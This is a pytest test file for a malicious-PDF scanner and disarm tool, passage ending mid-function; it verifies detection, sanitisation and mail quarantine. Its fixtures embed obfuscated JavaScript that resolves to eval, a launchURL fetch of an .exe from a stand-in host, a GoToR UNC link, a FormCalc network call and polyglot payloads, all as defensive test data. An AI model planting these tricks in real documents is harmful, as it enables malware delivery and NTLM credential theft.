from __future__ import annotations

from email import message_from_bytes
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
import hashlib
import importlib
import io
import json
from pathlib import Path
import socket
from unittest.mock import patch
import zlib

from fastapi.testclient import TestClient
from matplotlib import get_data_path
import numpy as np
import pikepdf
from PIL import Image
from production.onnx_engine import ONNXMalPDFScannerEngine
import pymupdf
from pypdf import PdfReader
import pytest
from scripts.deploy.export_onnx_models import _binary_parity, _fixture_binary_inputs

from malpdf.cdr.engine import PDFDisarmer
from malpdf.cdr.fixtures import load_real_benign_bytes, load_real_threat_bytes
from malpdf.extraction.font_containers import inspect_type1
from malpdf.gateway.mail_filter import MailGatewayFilter
from malpdf.scanner.engine import MalPDFScannerEngine
from malpdf.scanner.forensic import (
    _calibrated_probability,
    deobfuscate_javascript_static,
    evaluate_javascript_semantics,
    is_suspicious_uri,
    is_untrusted_http_uri,
)
from malpdf.scanner.ingestion import InstantPDFIngestion, inspect_pdf_codec_anomalies, inspect_polyglot_and_revisions
from malpdf.scanner.signatures import match_pdf_signatures
from malpdf.scanner.threat_intel import NullThreatIntelProvider, StaticBlocklistProvider
from test_four_pillar_improvements import phase2_variants as phase2_variants


@pytest.fixture(scope="module")
def engines():
    return MalPDFScannerEngine(device="cpu"), ONNXMalPDFScannerEngine()


def _scan(engines, raw, verdict, **options):
    pt, onnx = engines
    assert (
        _binary_parity(pt.model, onnx.bin_session, _fixture_binary_inputs(pt.ingestion.ingest(raw, **options))) <= 1e-5
    )
    for explain in (False, True):
        with (
            patch.object(pt, "calculate_energy_ood", wraps=pt.calculate_energy_ood) as pt_score,
            patch.object(onnx, "calculate_energy_ood", wraps=onnx.calculate_energy_ood) as onnx_score,
        ):
            results = [engine.scan_bytes(raw, explain=explain, **options) for engine in engines]
        assert [result.verdict for result in results] == [verdict, verdict]
        assert abs(results[0].malware_probability - results[1].malware_probability) <= 1e-5
        pt_logit, ort_logit = pt_score.call_args.args[0], onnx_score.call_args.args[0]
        assert abs(pt_logit - ort_logit) <= 1e-5
        assert (
            abs(
                _calibrated_probability(pt_logit, pt.temperature) - _calibrated_probability(ort_logit, onnx.temperature)
            )
            <= 1e-5
        )
    return results


def _observed_taxonomy(result, label):
    findings = result.forensic_dossier["threat_taxonomy"]["analyzer_detections"]
    finding = next(item for item in findings if item["id"] == label)
    assert finding["evidence_status"] == "observed"
    return finding["evidence"]


def _fixture(edit, base=None):
    with pikepdf.open(io.BytesIO(base if base is not None else load_real_benign_bytes())) as pdf:
        edit(pdf)
        output = io.BytesIO()
        pdf.save(output)
        return output.getvalue()


def _assert_integrity(raw, clean, audit, *, password=None):
    assert len(clean) > 0.8 * len(raw)
    assert audit.content_streams_preserved and audit.resources_preserved
    if password is not None:
        with (
            pymupdf.open(stream=raw, filetype="pdf") as before,
            pymupdf.open(stream=clean, filetype="pdf") as after,
        ):
            assert before.authenticate(password) and not after.needs_pass
            assert len(before) == len(after) == audit.original_pages == audit.sanitized_pages
            original_text = "".join(page.get_text() for page in before)
            assert original_text.strip() and "".join(page.get_text() for page in after) == original_text
        return
    before, after = (PdfReader(io.BytesIO(body)) for body in (raw, clean))
    assert len(before.pages) == len(after.pages) == audit.original_pages == audit.sanitized_pages
    original_text = "".join(page.extract_text() for page in before.pages)
    assert original_text.strip()
    assert "".join(page.extract_text() for page in after.pages) == original_text


def _annotate(pdf, subtype, **fields):
    page = pdf.pages[0].obj
    if "/Annots" not in page:
        page.Annots = pikepdf.Array()
    annotation = pikepdf.Dictionary(Type=pikepdf.Name.Annot, Subtype=pikepdf.Name(subtype), **fields)
    if "/Rect" not in annotation:
        annotation.Rect = pikepdf.Array([20, 20, 70, 70])
    page.Annots.append(pdf.make_indirect(annotation))


def _link(pdf, uri, *, subtype="/Link", rect=(20, 20, 70, 70)):
    _annotate(pdf, subtype, Rect=pikepdf.Array(rect), A=pikepdf.Dictionary(S=pikepdf.Name.URI, URI=uri))


@pytest.mark.parametrize(
    ("code", "value", "technique"),
    [
        ('atob("YWxlcnQ=")', "alert", "base64_atob_decode"),
        ('["a", "l", "ert"].join("")', "alert", "array_join_fold"),
        ('"trela".split("").reverse().join("")', "alert", "string_reverse_fold"),
    ],
)
def test_wave4b_static_folding(code, value, technique):
    assert deobfuscate_javascript_static(code) == {
        "deobfuscated_code": f'"{value}"',
        "deobfuscation_applied": True,
        "deobfuscation_techniques": [technique],
    }


def test_wave4b_resolves_computed_call_and_concatenated_url():
    code = 'var k = "laun"; k += "chURL"; var url = "https://example.invalid/" + "fixture.exe"; app[k](url);'
    semantics = evaluate_javascript_semantics([{"code": code}])
    assert "app.launchURL" in semantics["resolved_calls"]
    assert "https://example.invalid/fixture.exe" in semantics["resolved_urls"]
    assert semantics["flow_suspicious_urls"]
    assert semantics["malicious_indicator_count"] > 0


def test_wave4b_password_locked_ingestion():
    with pikepdf.open(io.BytesIO(load_real_benign_bytes())) as pdf:
        out = io.BytesIO()
        pdf.save(out, encryption=pikepdf.Encryption(owner="owner", user="fixture", R=4))
    raw = out.getvalue()
    ingestion = InstantPDFIngestion()
    assert ingestion.ingest(raw)["encryption_analysis"]["password_locked"]
    unlocked = ingestion.ingest(raw, password="fixture")
    assert unlocked["encryption_analysis"]["unlocked_with_password"]
    assert unlocked["encryption_analysis"]["graph_inspected"]
    assert unlocked["sha256"] == hashlib.sha256(raw).hexdigest() and unlocked["size_bytes"] == len(raw)
    assert ingestion.ingest(raw, password="bad")["encryption_analysis"]["inspection_warnings"] == [
        "encrypted_pdf_incorrect_password"
    ]
    with pytest.raises(ValueError, match="cdr_password_protected_requires_quarantine"):
        PDFDisarmer().sanitize_bytes(raw)
    with pikepdf.open(io.BytesIO(load_real_benign_bytes())) as pdf:
        out = io.BytesIO()
        pdf.save(out, encryption=pikepdf.Encryption(owner="owner", user="", R=4))
    empty = ingestion.ingest(out.getvalue())["encryption_analysis"]
    assert empty["unlocked_empty_password"] and empty["graph_inspected"] and not empty["password_locked"]


def _javascript_action(code):
    return pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String(code))


@pytest.mark.parametrize(
    ("code", "calls", "signature"),
    [
        ('var name = atob(["ZXZ", "hbA=="].join("")); this[name]();', {"eval"}, "JS_MULTILAYER_DROPPER"),
        ('var name = "lave".split("").reverse().join(""); this[name]();', {"eval"}, None),
        ("var fn = eval; fn();", {"eval"}, None),
        (
            'var name = "e"; name += "val"; window[name](); '
            'var url = "https://example.invalid/" + "fixture.exe"; app["laun" + "chURL"](url);',
            {"eval", "app.launchURL"},
            None,
        ),
        (
            'var fn = event.value ? app["launchURL"] : doc["submitForm"]; fn();',
            {"app.launchURL", "doc.submitForm"},
            None,
        ),
    ],
)
def test_wave4b_deep_javascript_scan_and_disarm(engines, code, calls, signature):
    raw = _fixture(lambda pdf: setattr(pdf.Root, "OpenAction", _javascript_action(code)))
    for result in _scan(engines, raw, "MALICIOUS"):
        semantics = result.forensic_dossier["js_semantics"]
        assert calls.issubset(semantics["resolved_calls"])
        assert semantics["malicious_indicator_count"] and not semantics["is_verified_benign_js"]
        if "fixture.exe" in code:
            assert semantics["flow_suspicious_urls"] == ["https://example.invalid/fixture.exe"]
        if signature:
            assert signature in {item["id"] for item in result.threat_taxonomy["matched_signatures"]}
    clean, audit = PDFDisarmer().sanitize_bytes(raw)
    assert audit.is_sanitized
    _assert_integrity(raw, clean, audit)
    for result in _scan(engines, clean, "BENIGN"):
        assert not result.forensic_dossier["js_semantics"]["has_scripts"]
        assert not result.threat_taxonomy["matched_signatures"]


def test_wave4b_benign_acroform_calls(engines):
    code = "AFNumber_Format(2, 0, 0, 0, '$', true); var qty = this.getField('Qty').value; app.alert(qty);"

    def edit(pdf):
        field = pdf.make_indirect(
            pikepdf.Dictionary(FT=pikepdf.Name.Tx, T="Amount", AA=pikepdf.Dictionary(F=_javascript_action(code)))
        )
        pdf.Root.AcroForm = pikepdf.Dictionary(Fields=pikepdf.Array([field]))

    for result in _scan(engines, _fixture(edit), "BENIGN"):
        semantics = result.forensic_dossier["js_semantics"]
        assert semantics["is_verified_benign_js"]
        assert semantics["malicious_indicator_count"] == 0
        assert {"AFNumber_Format", "this.getField", "app.alert"} <= set(semantics["resolved_calls"])
        assert result.threat_taxonomy["matched_signatures"] == []


def test_wave4b_locked_threat_scan_disarm_and_quarantine(engines, tmp_path):
    password = "fixture-test-password"
    with pikepdf.open(io.BytesIO(load_real_threat_bytes())) as pdf:
        out = io.BytesIO()
        pdf.save(out, encryption=pikepdf.Encryption(owner="owner-test-password", user=password, R=4))
    raw = out.getvalue()
    sha256 = hashlib.sha256(raw).hexdigest()
    for result in _scan(engines, raw, "BENIGN"):
        analysis = result.forensic_dossier["encryption_analysis"]
        assert analysis["encrypted"] and analysis["password_locked"] and not analysis["graph_inspected"]
        assert analysis["inspection_warnings"] == ["encrypted_pdf_structure_hidden_password_required"]
        assert result.sha256 == sha256 and result.file_size_bytes == len(raw)
        assert result.threat_taxonomy["encryption_analysis"] == analysis
        assert "mật khẩu" in result.threat_taxonomy["summary_vi"]
    for result in _scan(engines, raw, "MALICIOUS", password=password):
        analysis = result.forensic_dossier["encryption_analysis"]
        assert analysis["unlocked_with_password"] and analysis["graph_inspected"] and not analysis["password_locked"]
        assert result.forensic_dossier["js_semantics"]["malicious_indicator_count"] > 0
        assert result.sha256 == sha256
    disarmer = PDFDisarmer()
    clean, audit = disarmer.sanitize_bytes(raw, password=password)
    assert audit.is_sanitized and audit.text_integrity_verified
    _assert_integrity(raw, clean, audit, password=password)
    _scan(engines, clean, "BENIGN")
    input_path = tmp_path / "locked.pdf"
    input_path.write_bytes(raw)
    output_path, file_audit = disarmer.sanitize_file(input_path, password=password)
    _assert_integrity(raw, output_path.read_bytes(), file_audit, password=password)

    message = MIMEMultipart()
    attachment = MIMEApplication(raw, _subtype="pdf")
    attachment.add_header("Content-Disposition", "attachment", filename="locked.pdf")
    attachment["X-MalPDF-Reason"] = "forged"
    message.attach(attachment)
    gateway = MailGatewayFilter(scanner_engine=engines[0], quarantine_dir=tmp_path)
    output, report = gateway.process_email_bytes(message.as_bytes())
    assert report.action_taken == "QUARANTINED_PASSWORD_LOCKED"
    assert not report.attachments[0].disarmed and report.malicious_attachments == 0
    assert report.attachments[0].sha256 == sha256 and (tmp_path / f"{sha256}.pdf").read_bytes() == raw
    parsed = message_from_bytes(output)
    assert parsed["X-MalPDF-Inspection"] == "THREATS_QUARANTINED"
    parts = [part for part in parsed.walk() if part.get_content_disposition() == "attachment"]
    assert len(parts) == 1
    notice = parts[0]
    assert notice.get_content_type() == "text/plain" and notice.get_filename() == "quarantined_locked.pdf.txt"
    assert notice["X-MalPDF-Quarantined"] == "TRUE" and notice["X-MalPDF-Original-SHA256"].strip() == sha256
    assert notice.get_all("X-MalPDF-Reason") == ["PASSWORD_LOCKED_UNINSPECTABLE"]
    assert sha256.encode() in notice.get_payload(decode=True)

    gateway = MailGatewayFilter(scanner_engine=engines[1], quarantine_dir=tmp_path, quarantine_password_locked=False)
    output, report = gateway.process_email_bytes(message.as_bytes())
    assert report.action_taken == "PASSED"
    assert message_from_bytes(output).get_payload(0).get_payload(decode=True) == raw


def _remote_action(pdf):
    target = pikepdf.Dictionary(UF=r"\\fixture.invalid\share\reference.pdf")
    _annotate(pdf, "/Link", A=pikepdf.Dictionary(S=pikepdf.Name.GoToR, F=target, D=pikepdf.String("reference")))


def _attachment(pdf):
    _annotate(pdf, "/FileAttachment", FS=pikepdf.Dictionary(Type=pikepdf.Name.Filespec, F="reference.txt"))
    _annotate(pdf, "/Text", Contents="Keep this review note")


def _media_annotations(pdf):
    for subtype in ("/U3D", "/PRC"):
        model = pdf.make_stream(b"review marker", Subtype=pikepdf.Name(subtype))
        _annotate(pdf, "/3D", **{"3D": True, "3DD": model})
    pdf.Root.Wave4Media = pikepdf.Dictionary(U3D=True, PRC=True)


def _formcalc(pdf):
    pdf.Root.AcroForm = pikepdf.Dictionary(
        Fields=pikepdf.Array(),
        XFA=pdf.make_stream(
            b'<template><script contentType="application/x-formcalc"><![CDATA['
            b'Get("https://fixture.invalid/reference")]]></script></template>'
        ),
    )


@pytest.mark.parametrize(
    ("edit", "trigger"),
    [
        (_remote_action, "gotor_unc_ntlm_risk"),
        (_attachment, "/FileAttachment"),
        (_formcalc, "xfa_formcalc_network_call"),
    ],
)
def test_wave4_trigger_observed(edit, trigger):
    result = InstantPDFIngestion().ingest(_fixture(edit))
    assert trigger in result["non_js_triggers"]


def test_remote_goto_detected_and_disarmed(engines):
    raw = _fixture(_remote_action)
    for result in _scan(engines, raw, "MALICIOUS"):
        dossier = result.forensic_dossier
        target = dossier["phishing_analysis"]["suspicious_uris"][0]
        assert target["evidence_id"].startswith("action:gotor_")
        assert target["reasons"] == ["gotor_remote_unc_target"]
        assert "/GoToR" in dossier["non_js_triggers"]
        assert "/GoToR" in _observed_taxonomy(result, "suspicious_uri_redirect")
    clean, audit = PDFDisarmer().sanitize_bytes(raw)
    assert audit.is_sanitized and any("/GoToR" in path for path in audit.actions_stripped)
    _assert_integrity(raw, clean, audit)
    _scan(engines, clean, "BENIGN")


@pytest.mark.parametrize(
    ("edit", "triggers"),
    [
        (_attachment, {"/FileAttachment"}),
        (_media_annotations, {"/3D", "/U3D", "/PRC"}),
    ],
)
def test_attachment_and_3d_annotations_are_removed(engines, edit, triggers):
    raw = _fixture(edit)
    with pikepdf.open(io.BytesIO(raw)) as pdf:
        subtypes = [str(annot.Subtype) for annot in pdf.pages[0].obj.Annots]
    removed = {f"page_0_annot_{index}_{subtype[1:]}" for index, subtype in enumerate(subtypes) if subtype in triggers}
    assert len(removed) == (1 if edit is _attachment else 2)
    for result in _scan(engines, raw, "MALICIOUS"):
        assert triggers <= set(result.forensic_dossier["non_js_triggers"])
        if edit is _attachment:
            assert "/FileAttachment" in _observed_taxonomy(result, "embedded_dropper_or_launch")
        else:
            assert "/3D" in _observed_taxonomy(result, "structural_parser_evasion")
    clean, audit = PDFDisarmer().sanitize_bytes(raw)
    assert audit.is_sanitized
    for reported in (
        audit.removed_triggers,
        audit.structure_elements_removed,
        [x["object_id"] for x in audit.object_diff_matrix],
    ):
        assert removed <= set(reported)
    _assert_integrity(raw, clean, audit)
    with pikepdf.open(io.BytesIO(clean)) as pdf:
        assert [str(annot.Subtype) for annot in pdf.pages[0].obj.Annots] == [
            subtype for subtype in subtypes if subtype not in triggers
        ]
    _scan(engines, clean, "BENIGN")


def test_cdr_preserves_media_named_resources():
    def edit(pdf):
        page = pdf.pages[0].obj
        page.Resources.Properties = pdf.make_indirect(pikepdf.Dictionary({"/3D": pikepdf.Dictionary(U3D=True)}))
        _media_annotations(pdf)

    raw = _fixture(edit)
    clean, audit = PDFDisarmer().sanitize_bytes(raw)
    assert audit.is_sanitized
    _assert_integrity(raw, clean, audit)
    with pikepdf.open(io.BytesIO(clean)) as pdf:
        assert pdf.pages[0].obj.Resources.Properties["/3D"].U3D is True


def _add_xobject(pdf, stream):
    resources = pdf.pages[0].obj.Resources
    if "/XObject" not in resources:
        resources.XObject = pikepdf.Dictionary()
    resources.XObject.Wave4 = stream


def _image(pdf, body, **fields):
    stream = pdf.make_stream(
        body,
        Type=pikepdf.Name.XObject,
        Subtype=pikepdf.Name.Image,
        Width=2,
        Height=2,
        BitsPerComponent=8,
        ColorSpace=pikepdf.Name.DeviceRGB,
    )
    for key, value in fields.items():
        stream["/" + key] = value
    _add_xobject(pdf, stream)
    return stream


def _visual_lure(pdf, surface):
    page = pdf.pages[0].obj
    first_font = next(iter(page.Resources.Font.keys()))
    text = f"BT {first_font} 10 Tf 50 700 Td (Review) Tj ET".encode()
    if surface == "image":
        image = _image(pdf, b"\xff" * 12)
        for child_name in ("Image", "Inner"):
            image = pdf.make_stream(
                f"/{child_name} Do".encode(),
                Type=pikepdf.Name.XObject,
                Subtype=pikepdf.Name.Form,
                BBox=pikepdf.Array([0, 0, 100, 100]),
                Resources=pikepdf.Dictionary(XObject=pikepdf.Dictionary({"/" + child_name: image})),
            )
        page.Resources.XObject.Wave4 = image
        page.Contents = pdf.make_stream(text + b"\n/Wave4 Do")
        _link(pdf, "https://fixture.workers.dev/review")
    else:
        if "/XObject" in page.Resources:
            del page.Resources["/XObject"]
        page.Contents = pikepdf.Array([pdf.make_stream(text), pdf.make_stream(b"q 0 0 200 200 re f Q")])
        _link(pdf, "https://docs.google.com/forms/d/fixture/viewform", subtype="/Widget", rect=(0, 0, 100, 100))
        widget = page.Annots[-1]
        widget.FT = pikepdf.Name.Btn
        widget.T = "Review"
        pdf.Root.AcroForm = pikepdf.Dictionary(Fields=pikepdf.Array([widget]))


@pytest.mark.parametrize(("surface", "area"), [("image", 2500.0), ("vector", 10000.0)])
def test_visual_lure_options(engines, surface, area):
    raw = _fixture(lambda pdf: _visual_lure(pdf, surface))
    with pikepdf.open(io.BytesIO(raw)) as pdf:
        index = len(pdf.pages[0].obj.Annots) - 1
    for result in _scan(engines, raw, "MALICIOUS"):
        phishing = result.forensic_dossier["phishing_analysis"]
        assert phishing["image_only_lure"]
        target = phishing["suspicious_uris"][0]
        assert target["page_index"] == 0 and target["rect_area"] == area
        assert target["reasons"] == ["image_only_visual_lure"]
    clean, audit = PDFDisarmer().sanitize_bytes(raw)
    assert audit.is_sanitized and f"page_0_annot_{index}_{surface}_lure_URI" in audit.actions_stripped
    _assert_integrity(raw, clean, audit)
    with pikepdf.open(io.BytesIO(clean)) as pdf:
        assert "/A" not in pdf.pages[0].obj.Annots[index]
    _scan(engines, clean, "BENIGN")


def _with_page_text(text):
    if not text:
        return load_real_benign_bytes()
    if text.isascii():

        def edit(pdf):
            page = pdf.pages[0]
            page.obj.Resources.Font.Wave4Text = pikepdf.Dictionary(
                Type=pikepdf.Name.Font, Subtype=pikepdf.Name.Type1, BaseFont=pikepdf.Name.Helvetica
            )
            page.contents_add(f"BT /Wave4Text 10 Tf 40 720 Td ({text}) Tj ET".encode("ascii"))

        return _fixture(edit)
    font = Path(get_data_path()) / "fonts" / "ttf" / "DejaVuSans.ttf"
    with pymupdf.open(stream=load_real_benign_bytes()) as doc:
        doc[0].insert_text((40, 40), text, fontname="Wave4Text", fontfile=str(font), fontsize=9)
        doc.subset_fonts()
        return doc.tobytes(garbage=3, deflate=True)


def test_wave4b_signatures_in_both_runtimes(engines):
    def cve_indicators(pdf):
        pdf.Root.OpenAction = _javascript_action('app.alert("TIFF SubIFD and BMP RLE markers");')

    fixtures = [
        (_fixture(cve_indicators), {"CVE-2010-0188", "CVE-2013-2729"}),
        (_fixture(_remote_action), {"GOTOR_UNC_NTLM"}),
        (load_real_benign_bytes() + b"\n<script>/* inert fixture */</script>", {"POLYGLOT_ACTIVE_PAYLOAD"}),
    ]
    for raw, signatures in fixtures:
        for result in _scan(engines, raw, "MALICIOUS"):
            matches = result.forensic_dossier["signature_matches"]
            assert matches == result.threat_taxonomy["matched_signatures"]
            assert signatures <= {item["id"] for item in matches if item["severity"] == "critical"}


def test_wave4b_signature_rule_targets(tmp_path):
    tags = ["cve_2018_4990", "cve_2023_21608", "cve_2023_26369"]
    findings = match_pdf_signatures(
        b"", {"anomaly_tags": tags, "xfa_analysis": {"anomalies": ["xfa_xml_dtd_unsupported"]}}
    )
    assert {item["id"] for item in findings} == {tag.upper().replace("_", "-") for tag in tags} | {"XFA_XML_DTD_XXE"}
    rules = tmp_path / "custom-rules.json"
    rules.write_text(
        json.dumps(
            [
                {
                    "id": name,
                    "name": name,
                    "severity": "high",
                    "description_vi": name,
                    "target": name,
                    "pattern": pattern,
                }
                for name, pattern in [("raw", "marker$"), ("uri", r"^https://example\.invalid/marker$")]
            ]
        ),
        encoding="utf-8",
    )
    uris = {"extracted_uris": [{"uri": "https://example.invalid/marker"}]}
    assert [item["id"] for item in match_pdf_signatures(b"%PDF-marker", uris, rules)] == ["raw", "uri"]
    assert match_pdf_signatures(b" " * 40_000 + b"marker" + b" " * 40_000, {}, rules) == []


def test_wave4b_benign_signature_controls(engines, phase2_variants):
    clean, audit = PDFDisarmer().sanitize_bytes(load_real_threat_bytes())
    _assert_integrity(load_real_threat_bytes(), clean, audit)
    benign_variants = {name: raw for name, (group, raw) in phase2_variants.items() if group == "benign"}
    assert len(benign_variants) == 12
    controls = {
        **benign_variants,
        "real benign": load_real_benign_bytes(),
        "CDR": clean,
        "Vietnamese": _with_page_text("Hóa đơn giá trị gia tăng - Chữ ký số hợp lệ"),
    }
    for name, raw in controls.items():
        for engine in engines:
            result = engine.scan_bytes(raw, explain=True)
            assert result.verdict == "BENIGN", name
            assert result.threat_taxonomy["matched_signatures"] == [], name
            assert not result.forensic_dossier["js_semantics"]["malicious_indicator_count"], name


@pytest.mark.parametrize("match_type", ["sha256", "domain"])
def test_wave4b_offline_threat_intel(engines, tmp_path, monkeypatch, match_type):
    raw = _fixture(lambda pdf: _link(pdf, "https://child.example.invalid/reference"))
    sha256 = hashlib.sha256(raw).hexdigest()
    config = tmp_path / "blocklist.json"
    config.write_text(
        json.dumps(
            {
                "source": "fixture_blocklist",
                "sha256_blocklist": [sha256.upper()] if match_type == "sha256" else [],
                "domain_blocklist": ["EXAMPLE.invalid."] if match_type == "domain" else [],
            }
        ),
        encoding="utf-8",
    )
    provider = StaticBlocklistProvider.from_json_file(config)
    assert provider.lookup_domain("notexample.invalid") is None
    assert provider.lookup_domain("example.invalid.other.invalid") is None
    assert NullThreatIntelProvider().lookup_sha256(sha256) is None
    assert NullThreatIntelProvider().lookup_domain("example.invalid") is None
    intel_engines = (
        MalPDFScannerEngine(device="cpu", threat_intel=provider),
        ONNXMalPDFScannerEngine(threat_intel=provider),
    )

    def network_call(*args, **kwargs):
        pytest.fail("offline scan attempted networking")

    monkeypatch.setattr(socket, "getaddrinfo", network_call)
    monkeypatch.setattr(socket.socket, "connect", network_call)
    for result in _scan(engines, raw, "BENIGN"):
        assert "threat_intel" not in result.forensic_dossier
    for result in _scan(intel_engines, raw, "MALICIOUS"):
        intel = result.forensic_dossier["threat_intel"]
        assert intel["hit"] and len(intel["matches"]) == 1
        hit = intel["matches"][0]
        assert hit["type"] == match_type and hit["source"] == "fixture_blocklist"
        if match_type == "domain":
            assert hit["domain"] == "child.example.invalid" and hit["matched_domain"] == "example.invalid"
        else:
            assert hit["sha256"] == sha256
    for engine in intel_engines:
        assert engine.scan_bytes(raw, explain=False).forensic_dossier["threat_intel"]["hit"]


def test_wave4b_wave4a_tensors_are_bit_exact(engines, monkeypatch):
    save = pikepdf.Pdf.save

    def deterministic_save(pdf, stream, **options):
        return save(pdf, stream, deterministic_id=True, **options)

    monkeypatch.setattr(pikepdf.Pdf, "save", deterministic_save)
    threat = load_real_threat_bytes()
    clean, audit = PDFDisarmer().sanitize_bytes(threat)
    _assert_integrity(threat, clean, audit)
    keys = (
        "node_features",
        "node_types",
        "edge_index",
        "edge_rel",
        "batch",
        "ast_tokens",
        "v3_tab_features",
        "graph_present",
    )
    cases = [
        (load_real_benign_bytes(), "75218336804a531165bb5f41bc6414cf44cb2a9ffdfbc0b76566351f59d66f93"),
        (threat, "94e288210f06ccbb9bca8378a85f7fc8266ecdfdcacbc52a3eafc5dcbb3b2b0b"),
        (clean, "eca4e1290ae0aa6c8417ca2e4c9a1f3e0efd6c89e1256dee346a42348cdd896a"),
    ]
    for raw, expected in cases:
        for engine in engines:
            ingested = engine.ingestion.ingest(raw)
            arrays = {key: np.asarray(ingested[key]) for key in keys}
            hashes = {
                key: [str(a.dtype), list(a.shape), hashlib.sha256(a.tobytes()).hexdigest()] for key, a in arrays.items()
            }
            assert hashlib.sha256(json.dumps(hashes, sort_keys=True).encode()).hexdigest() == expected


@pytest.mark.parametrize(
    ("uri", "text", "verdict"),
    [
        ("https://docs.google.com/forms/d/fixture/viewform", "Review and sign. Confirm your identity.", "MALICIOUS"),
        ("https://fixture.workers.dev/reference", "Xác minh tài khoản. Đăng nhập để xem.", "MALICIOUS"),
        ("https://docs.google.com/forms/d/fixture/viewform", "", "BENIGN"),
        ("https://fixture.workers.dev/reference", "", "BENIGN"),
        ("https://tenant.firebaseio.com/reference", "", "BENIGN"),
        ("https://docs.google.com/document/d/fixture/edit", "", "BENIGN"),
        ("https://github.com/example/project/blob/main/README.md", "", "BENIGN"),
        (
            "https://fixture.workers.dev/reference",
            "Cộng hòa xã hội chủ nghĩa Việt Nam - Hóa đơn giá trị gia tăng - Chữ ký số hợp lệ",
            "BENIGN",
        ),
    ],
)
def test_user_content_and_vietnamese_lure_context(engines, uri, text, verdict):
    raw = _fixture(lambda pdf: _link(pdf, uri), _with_page_text(text))
    if text:
        assert text in PdfReader(io.BytesIO(raw)).pages[0].extract_text()
    for result in _scan(engines, raw, verdict):
        analysis = result.forensic_dossier["phishing_analysis"]
        assert analysis["has_phishing_threat"] is (verdict == "MALICIOUS")
        if verdict == "MALICIOUS":
            assert len(analysis["lure_phrases"]) >= 2
            assert analysis["suspicious_uris"][0]["reasons"] == ["phishing_lure_context"]
    if verdict == "MALICIOUS":
        clean, audit = PDFDisarmer().sanitize_bytes(raw)
        assert audit.is_sanitized
        _assert_integrity(raw, clean, audit)
        _scan(engines, clean, "BENIGN")


@pytest.mark.parametrize(
    ("url", "untrusted"),
    [
        ("https://forms.office.com/pages/responsepage.aspx", True),
        ("https://oneapp.firebaseapp.com/reference", True),
        ("https://docs.google.com/%66orms/d/fixture", True),
        ("https://pages.github.io/reference", True),
        ("https://onedrive.live.com/redir?resid=fixture", True),
        ("https://docs.google.com/document/d/fixture", False),
        ("https://github.com/example/docs", False),
    ],
)
def test_user_content_overrides_official_domain(url, untrusted):
    assert is_untrusted_http_uri(url) is untrusted
    observed, reasons = is_suspicious_uri(url, lure_phrases={"review and sign", "confirm your identity"})
    assert observed is untrusted
    assert reasons == (["phishing_lure_context"] if untrusted else [])


def test_xfa_formcalc_is_enforced_and_removed(engines):
    raw = _fixture(_formcalc)
    for result in _scan(engines, raw, "MALICIOUS"):
        analysis = result.forensic_dossier["xfa_analysis"]
        assert analysis["formcalc_count"] == 1
        assert "xfa_formcalc_network_call" in analysis["anomalies"]
        assert "xfa_formcalc_network_call" in _observed_taxonomy(result, "structural_parser_evasion")
    clean, audit = PDFDisarmer().sanitize_bytes(raw)
    assert audit.is_sanitized and "acroform_XFA" in audit.structure_elements_removed
    _assert_integrity(raw, clean, audit)
    _scan(engines, clean, "BENIGN")


@pytest.mark.parametrize(
    ("payload", "signature"),
    [
        (b"\n\x00PK\x03\x04", "zip"),
        (b"\n<!-- review marker --><ScRiPt type='application/json'>{}</ScRiPt>", "html_script"),
    ],
)
def test_trailing_polyglot_is_stripped(engines, payload, signature):
    raw = load_real_benign_bytes() + payload
    for result in _scan(engines, raw, "MALICIOUS"):
        analysis = result.forensic_dossier["polyglot_analysis"]
        assert analysis["has_polyglot_payload"] and analysis["suffix_signatures"] == [signature]
        assert analysis["anomalies"][0] in _observed_taxonomy(result, "structural_parser_evasion")
        assert result.forensic_dossier["threat_taxonomy"]["polyglot_analysis"] == analysis
    clean, audit = PDFDisarmer().sanitize_bytes(raw)
    assert audit.is_sanitized and "polyglot_payload_stripped" in audit.removed_triggers
    assert "polyglot_payload_stripped" in audit.structure_elements_removed
    assert "polyglot_payload_stripped" in {x["object_id"] for x in audit.object_diff_matrix}
    assert not inspect_polyglot_and_revisions(clean)["has_polyglot_payload"]
    _assert_integrity(raw, clean, audit)
    _scan(engines, clean, "BENIGN")


@pytest.mark.parametrize(
    ("prefix", "signature"),
    [
        (b" \x00MZ This program", "pe"),
        (b"\x7fELF", "elf"),
        (b"Rar!\x1a\x07", "rar"),
        (b"7z\xbc\xaf\x27\x1c", "7z"),
        (b"<?PHP ", "php"),
        (b"#!/", "shebang"),
    ],
)
def test_bounded_polyglot_signatures_and_revision_count(prefix, signature):
    result = inspect_polyglot_and_revisions(prefix + b"\n%PDF-1.7\n%%EOF\n%%EOF\n")
    assert result["prefix_signatures"] == [signature] and not result["suffix_signatures"]
    assert result["incremental_eof_count"] == 2
    assert not inspect_polyglot_and_revisions(b"%PDF-1.7\n%%EOF\n%%EOF\x00\n")["has_polyglot_payload"]


def test_cdr_quarantines_polyglot_when_rewrite_retains_signature(monkeypatch):
    raw = load_real_benign_bytes() + b"\nPK\x03\x04"
    save = pikepdf.Pdf.save

    def save_with_signature(pdf, destination, **options):
        save(pdf, destination, **options)
        destination.write(b"\nPK\x03\x04")

    monkeypatch.setattr(pikepdf.Pdf, "save", save_with_signature)
    clean, audit = PDFDisarmer().sanitize_bytes(raw)
    assert audit.quarantine_recommended and not audit.is_sanitized
    assert "polyglot_payload_stripped" not in audit.removed_triggers
    _assert_integrity(raw, clean, audit)


def _font(pdf, key, body, subtype=None):
    original = next(font for font in pdf.pages[0].obj.Resources.Font.values() if "/FontDescriptor" in font)
    stream = pdf.make_stream(body)
    if subtype:
        stream.Subtype = pikepdf.Name(subtype)
    for alternate in ("/FontFile", "/FontFile2", "/FontFile3"):
        if alternate != key and alternate in original.FontDescriptor:
            del original.FontDescriptor[alternate]
    original.FontDescriptor[key] = stream


def _ccitt(pdf, *, cols=2, rows=2, k=-1, wrapped=False):
    image = Image.new("1", (2, 2))
    tiff = io.BytesIO()
    image.save(tiff, format="TIFF", compression="group4")
    with Image.open(tiff) as encoded:
        (offset,), (length,) = encoded.tag_v2[273], encoded.tag_v2[279]
        body = tiff.getvalue()[offset : offset + length]
    decoder = pikepdf.Name.CCITTFaxDecode
    parms = pikepdf.Dictionary(Columns=cols, Rows=rows, K=k)
    _image(
        pdf,
        zlib.compress(body) if wrapped else body,
        Filter=pikepdf.Array([pikepdf.Name.FlateDecode, decoder]) if wrapped else decoder,
        DecodeParms=pikepdf.Array([None, parms]) if wrapped else parms,
